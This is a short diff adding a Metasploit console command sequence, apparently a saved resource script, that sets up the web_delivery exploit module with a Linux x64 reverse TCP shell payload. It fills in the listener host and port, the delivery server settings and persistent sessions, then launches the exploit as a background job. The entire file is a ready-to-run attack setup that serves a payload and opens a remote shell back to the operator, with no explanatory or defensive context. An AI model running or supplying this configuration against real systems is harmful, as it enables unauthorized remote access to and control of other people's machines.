@@ -1,0 +1,16 @@
+search web_deliv
+use exploit/multi/script/web_delivery
+show options
+show targets
+set TARGET 6
+show options
+set PAYLOAD linux/x64/shell_reverse_tcp
+show options
+set LPORT 8888
+set LHOST <IP>
+set SRVPORT 8088
+show options
+jobs -K
+set SRVHOST 0.0.0.0
+set ExitOnSession false
+exploit -j -z
